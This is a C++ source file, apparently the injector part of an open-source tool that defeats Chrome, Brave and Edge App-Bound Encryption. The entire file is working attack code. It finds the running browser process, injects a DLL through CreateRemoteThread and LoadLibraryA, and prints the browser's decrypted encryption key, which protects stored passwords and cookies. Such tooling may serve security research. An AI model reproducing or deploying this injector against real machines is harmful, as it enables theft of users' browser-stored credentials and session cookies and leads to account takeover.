#include <Windows.h>
#include <tlhelp32.h>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <iomanip>
#include <cctype>

void SetConsoleColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

void DisplayBanner() {
    SetConsoleColor(12);
    std::cout << "------------------------------------------------" << std::endl;
    std::cout << "|  Chrome App-Bound Encryption Decryption      |" << std::endl;
    std::cout << "|  CreateRemoteThread + LoadLibrary Injection  |" << std::endl;
    std::cout << "|  v0.3 by @xaitax                             |" << std::endl;
    std::cout << "------------------------------------------------" << std::endl;
    std::cout << "" << std::endl;
    SetConsoleColor(7);
}

void CleanupPreviousRun() {
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        std::string logFile = std::string(tempPath) + "chrome_decrypt.log";
        std::string keyFile = std::string(tempPath) + "chrome_appbound_key.txt";
        DeleteFileA(logFile.c_str());
        DeleteFileA(keyFile.c_str());
    }
}

std::string WideToUtf8(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
    if (size_needed <= 0) return {};
    
    std::string result(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), &result[0], size_needed, nullptr, nullptr);
    return result;
}

DWORD GetProcessIdByName(const std::wstring& processName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W entry = {};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snap, &entry)) {
        do {
            if (processName == entry.szExeFile) {
                CloseHandle(snap);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snap, &entry));
    }
    CloseHandle(snap);
    return 0;
}

std::string GetDllPath() {
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH)) {
        char drive[_MAX_DRIVE];
        char dir[_MAX_DIR];
        char fname[_MAX_FNAME];
        char ext[_MAX_EXT];
        _splitpath_s(path, drive, _MAX_DRIVE, dir, _MAX_DIR, fname, _MAX_FNAME, ext, _MAX_EXT);
        std::string dllPath = std::string(drive) + std::string(dir) + "chrome_decrypt.dll";
        return dllPath;
    }
    return "";
}

bool InjectDll(DWORD pid, const std::string& dllPath) {
    HANDLE proc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                             PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!proc) return false;

    LPVOID remote = VirtualAllocEx(proc, nullptr, dllPath.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) {
        CloseHandle(proc);
        return false;
    }

    if (!WriteProcessMemory(proc, remote, dllPath.c_str(), dllPath.size() + 1, nullptr)) {
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
        CloseHandle(proc);
        return false;
    }

    auto loader = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
    if (!loader) {
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
        CloseHandle(proc);
        return false;
    }

    HANDLE thread = CreateRemoteThread(proc, nullptr, 0, loader, remote, 0, nullptr);
    if (!thread) {
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
        CloseHandle(proc);
        return false;
    }

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
    CloseHandle(proc);
    return true;
}

std::string GetTempFilePath() {
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        return std::string(tempPath) + "chrome_appbound_key.txt";
    }
    return "";
}

std::string ReadKeyFromFile() {
    std::string tempFile = GetTempFilePath();
    if (!tempFile.empty()) {
        std::ifstream ifs(tempFile);
        if (ifs) {
            std::string key;
            std::getline(ifs, key);
            return key;
        }
    }
    return "";
}

void PrintChromeVersion(const std::wstring& chromePath) {
    DWORD handle = 0;
    DWORD versionSize = GetFileVersionInfoSizeW(chromePath.c_str(), &handle);
    if (versionSize == 0) return;

    std::vector<char> versionData(versionSize);
    if (!GetFileVersionInfoW(chromePath.c_str(), handle, versionSize, versionData.data())) return;

    VS_FIXEDFILEINFO* fileInfo = nullptr;
    UINT size = 0;
    if (!VerQueryValueW(versionData.data(), L"\\", (LPVOID*)&fileInfo, &size)) return;

    if (fileInfo) {
        DWORD major = HIWORD(fileInfo->dwFileVersionMS);
        DWORD minor = LOWORD(fileInfo->dwFileVersionMS);
        DWORD build = HIWORD(fileInfo->dwFileVersionLS);
        DWORD revision = LOWORD(fileInfo->dwFileVersionLS);

        std::string browserName;
        if (chromePath.find(L"Brave") != std::wstring::npos) {
            browserName = "Brave";
        }
        else if (chromePath.find(L"Edge") != std::wstring::npos) {
            browserName = "Edge";
        }
        else {
            browserName = "Chrome";
        }

        SetConsoleColor(10);
        std::cout << "[+] ";
        SetConsoleColor(7);
        std::cout << browserName << " Version: " << major << "." << minor << "." << build << "." << revision << std::endl;
    }
}

void DisplayLog() {
    char tempPath[MAX_PATH];

    if (!GetTempPathA(MAX_PATH, tempPath))
        return;

    std::string logFile = std::string(tempPath) + "chrome_decrypt.log";
    std::ifstream file(logFile);
    if (!file)
        return;

    const WORD DEFAULT_COLOUR = 7;

    std::string line;
    while (std::getline(file, line)) {
        if (line.empty())
            continue;
        size_t pos = 0;
        while (pos < line.size()) {
            size_t brOpen = line.find('[', pos);

            SetConsoleColor(DEFAULT_COLOUR);
            std::cout << line.substr(pos, brOpen == std::string::npos ? std::string::npos
                                                                     : brOpen - pos);

            if (brOpen == std::string::npos)
                break;

            size_t brClose = line.find(']', brOpen);
            if (brClose == std::string::npos) {
                break;
            }

            std::string token = line.substr(brOpen, brClose - brOpen + 1);

            if (token == "[+]")          SetConsoleColor(10);
            else if (token == "[-]")     SetConsoleColor(12);
            else if (token == "[*]")     SetConsoleColor(9);
            else                         SetConsoleColor(DEFAULT_COLOUR);

            std::cout << token;

            pos = brClose + 1;
        }
        std::cout << std::endl;
    }

    file.close();
    DeleteFileA(logFile.c_str());
}

int main(int argc, char* argv[]) {
    DisplayBanner();
    if (argc < 2) {
        SetConsoleColor(12);
        std::cerr << "Usage: " << argv[0] << " <browserType: chrome|brave|edge>" << std::endl;
        SetConsoleColor(7);
        return 1;
    }

    CleanupPreviousRun();

    std::string browserType = argv[1];
    std::wstring processName;
    std::wstring executablePath;
    std::string browserDisplay = browserType;
    browserDisplay[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(browserDisplay[0])));

    if (browserType == "chrome") {
        processName = L"chrome.exe";
        executablePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    }
    else if (browserType == "brave") {
        processName = L"brave.exe";
        executablePath = L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
    }
    else if (browserType == "edge") {
        processName = L"msedge.exe";
        executablePath = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    }
    else {
        SetConsoleColor(12);
        std::cerr << "[-] Unsupported browser type" << std::endl;
        SetConsoleColor(7);
        return 1;
    }

    DWORD pid = GetProcessIdByName(processName);
    if (!pid) {
        SetConsoleColor(12);
        std::cerr << "[-] " << browserType << " not running" << std::endl;
        SetConsoleColor(7);
        return 1;
    }

    SetConsoleColor(9);
    std::cout << "[*] ";
    SetConsoleColor(7);
    std::cout << "Located " << browserDisplay << " with PID " << pid << std::endl;

    PrintChromeVersion(executablePath);

    std::string dllPath = GetDllPath();
    if (dllPath.empty()) {
        SetConsoleColor(12);
        std::cerr << "[-] Could not locate chrome_decrypt.dll" << std::endl;
        SetConsoleColor(7);
        return 1;
    }

    if (!InjectDll(pid, dllPath)) {
        SetConsoleColor(12);
        std::cerr << "[-] DLL injection failed" << std::endl;
        SetConsoleColor(7);
        return 1;
    }

    SetConsoleColor(10);
    std::cout << "[+] ";
    SetConsoleColor(7);
    std::cout << "DLL injected." << std::endl;

    SetConsoleColor(9);
    std::cout << "[*] ";
    SetConsoleColor(7);
    std::cout << "Starting Chrome App-Bound Encryption Decryption process." << std::endl;

    Sleep(1000);

    DisplayLog();

    std::string key = ReadKeyFromFile();
    if (!key.empty()) {
        std::cout << std::endl;
        SetConsoleColor(10);
        std::cout << "[+] Decrypted Key: " << key << std::endl;
        SetConsoleColor(7);
    }
    else {
        SetConsoleColor(12);
        std::cerr << "[-] Could not retrieve decrypted key" << std::endl;
        SetConsoleColor(7);
        return 1;
    }

    return 0;
}